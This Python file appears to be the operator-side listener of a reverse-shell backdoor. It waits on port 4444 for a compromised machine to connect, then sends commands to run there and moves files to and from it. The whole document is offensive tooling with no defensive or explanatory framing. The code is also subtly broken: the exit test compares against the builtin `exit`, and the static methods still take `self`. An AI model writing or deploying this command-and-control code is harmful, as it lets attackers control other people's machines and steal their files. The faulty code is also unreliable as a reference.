# Imports
import socket
import json
import base64


# Listener Class
class Listener:
    # Constructor
    def __init__(self, ip, port):
        # Creating Listener
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Start Listening
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")

        # Accept Connections
        self.connection, self.address = listener.accept()
        print("[+] Got a Connection from " + str(self.address))

    # Reliable Data Sending
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    # Reliable Data Receiving
    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    # Execute Commands Remotely
    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == exit:
            self.connection.close()
            exit()

        return self.reliable_receive()

    # Writing to a File
    @staticmethod
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    # Reading a file
    @staticmethod
    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    # Run Remote Command Execution
    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == 'upload':
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == 'download' and "[-] Error" not in result:
                    result = self.write_file(command[1], result)

            except Exception:
                result = "[-] Error during command execution."

            print(result)


listen = Listener("127.0.0.1", 4444)
listen.run()
